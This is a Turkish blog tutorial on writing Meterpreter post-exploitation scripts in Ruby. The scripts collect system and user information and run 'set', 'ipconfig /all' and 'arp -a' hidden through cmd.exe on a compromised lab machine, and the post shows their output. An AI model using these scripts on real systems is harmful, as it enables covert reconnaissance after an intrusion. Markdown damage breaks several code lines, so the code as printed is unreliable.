---
draft: false

title:  'MSF Meterpreter Script Düzenleme'
date: '2017-06-14T13:49:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  "Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve\_helloworld.rb\_olarak\_/usr/share/metasploit-framework/scripts/meterpreter\_klasörüne kayıt edelim." 
 
url:  /tr/msf-meterpreter-script-duzenleme/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


## Script Yazma



Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve `helloworld.rb` olarak `/usr/share/metasploit-framework/scripts/meterpreter` klasörüne kayıt edelim.


```bash
root@kali:~# echo “print_status(“Hello World”)” > /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
```



Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.


```bash
meterpreter > run helloworld
> Hello World
meterpreter >
```



Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını `helloworld.rb` dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.


```bash
print_error(“this is an error!”)
print_line(“this is a line”)
```



Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım.


```bash
meterpreter > run helloworld
> Hello World
**[**-] this is an error!
this is a line
meterpreter >
```



## helloworld.rb



Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır.


```bash
print_status("Hello World")
print_error("this is an error!")
print_line("This is a line")
```



Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır.


```bash
 def geninfo(session)
    begin
    …..
    rescue ::Exception => e
    …..
    end
 end
```



Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra `helloworld.rb` dosyamızın içeriği aşağıdaki gibi olacaktır.


```bash
 def getinfo(session)
    begin
       sysnfo **=** session.sys.config.sysinfo
       runpriv **=** session.sys.config.getuid
       print_status("Getting system information ...")
       print_status("tThe target machine OS is #{sysnfo['OS']}")
       print_status("tThe computer name is #{'Computer'} ")
       print_status("tScript running as #{runpriv}")
    rescue ::Exception => e
       print_error("The following error was encountered #{e}")
    end
 end
```



Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri `session` değişkeninden alan `getinfo(session)` isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir. `sysnfo = session.sys.config.sysinfo` satırı sistem bilgisini getirirken `runpriv = session.sys.config.getuid` kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır.



## helloworld2.rb



İlk oluşturduğumuz dosyaya ufak bir ilave yaparak `helloworld2.rb` dosyası üretelim. `helloworld2.rb` dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı `helloworld2.rb` olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır.


```bash
 def getinfo(session)
    begin
       sysnfo **=** session.sys.config.sysinfo
       runpriv **=** session.sys.config.getuid
       print_status("Getting system information ...")
       print_status("tThe target machine OS is #{sysnfo['OS']}")
       print _status("tThe computer name is #{'Computer'} ")
       print_status("tScript running as #{runpriv}")
 rescue ::Exception => e
       print_error("The following error was encountered #{e}")
    end
 end

 getinfo(client)
```



Şimdi hazırladığımız `helloworld2.rb` dosyamızı Meterpreter oturumunda çalıştıralım.


```bash
 meterpreter > run helloworld2
 > Getting system information ...
 >     The target machine OS is Windows XP (Build 2600, Service Pack 3).
 >     The computer name is Computer
 >     Script running as WINXPVM01labuser
```



Gördüğünüz gibi `helloworld2.rb` scripti ile bir takım sistem bigilerini ele etmiş olduk.



## helloworld3.rb



Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır.


```bash
def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r**=**''
    session.response_timeout**=**120
    cmdlst.each **do** |cmd|
       begin
          print_status "running command #{cmd}"
          r **=** session.sys.process.execute("cmd.exe /c #{cmd}", nil, **{**'Hidden' => true, 'Channelized' => true**})**
          **while**(d **=** r.channel.read)             print_status("t#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end commands **=** **[** "set",
    "ipconfig  /all",
    "arp -a"**]** list_exec(client,commands)
```



Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle, `list_exec` isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon, `session` ve `cmdlist` isimli iki değişken almaktadır. `cmdlist` değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak `cmd.exe` üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için `session.response_timeout=120` 120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır.



`cmdlist` dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır.


```bash
 commands **=** **[** “set”,
    “ipconfig  /all”,
    “arp –a”]
```



Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı `list_exec(client,commands)` bulunmaktadır.



Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım.


```bash
 meterpreter > run helloworld3
 > Running Command List ...
 >     running command set
 >     ALLUSERSPROFILE**=**C:\Documents and Settings\All Users
 APPDATA**=**C:\Documents and Settings\P0WN3D\Application Data
 CommonProgramFiles**=**C:\Program Files\Common Files
 COMPUTERNAME**=**TARGET
 ComSpec**=**C:\WINNT\system32\cmd.exe
 HOMEDRIVE**=**C:
 HOMEPATH**=**
 LOGONSERVER**=**TARGET
 NUMBER_OF_PROCESSORS**=**1
 OS**=**Windows_NT
 Os2LibPath**=**C:\WINNT\system32\os2dll;
 Path**=**C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
 PATHEXT**=**.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
 PROCESSOR_ARCHITECTURE**=**x86
 PROCESSOR_IDENTIFIER**=**x86 Family 6 Model 7 Stepping 6, GenuineIntel
 PROCESSOR_LEVEL**=**6
 PROCESSOR_REVISION**=**0706
 ProgramFiles**=**C:\Program Files
 PROMPT**=**$P$G
 SystemDrive**=**C:
 SystemRoot**=**C:\WINNT
 TEMP**=**C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
 TMP**=**C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
 USERDOMAIN**=**TARGET
 USERNAME**=**P0WN3D
 USERPROFILE**=**C:\Documents and Settings\P0WN3D
 windir**=**C:\WINNT >     running command ipconfig  /all
 >     
 Windows 2000 IP Configuration Host Name . . . . . . . . . . . . : target
 Primary DNS Suffix  . . . . . . . : 
 Node Type . . . . . . . . . . . . : Hybrid
 IP Routing Enabled. . . . . . . . : No
 WINS Proxy Enabled. . . . . . . . : No
 DNS Suffix Search List. . . . . . : localdomain Ethernet adapter Local Area Connection: Connection-specific DNS Suffix  . : localdomain
 Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter
 Physical Address. . . . . . . . . : 00-0C-29-85-81-55
 DHCP Enabled. . . . . . . . . . . : Yes
 Autoconfiguration Enabled . . . . : Yes
 IP Address. . . . . . . . . . . . : 172.16.104.145
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 172.16.104.2
 DHCP Server . . . . . . . . . . . : 172.16.104.254
 DNS Servers . . . . . . . . . . . : 172.16.104.2
 Primary WINS Server . . . . . . . : 172.16.104.2
 Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM
 Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM >     running command arp -a
 >     
 Interface: 172.16.104.145 on Interface 0x1000003
 Internet Address      Physical Address      Type
 172.16.104.2          00-50-56-eb-db-06     dynamic   
 172.16.104.150        00-0c-29-a7-f1-c5     dynamic    meterpreter >
```



Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir.
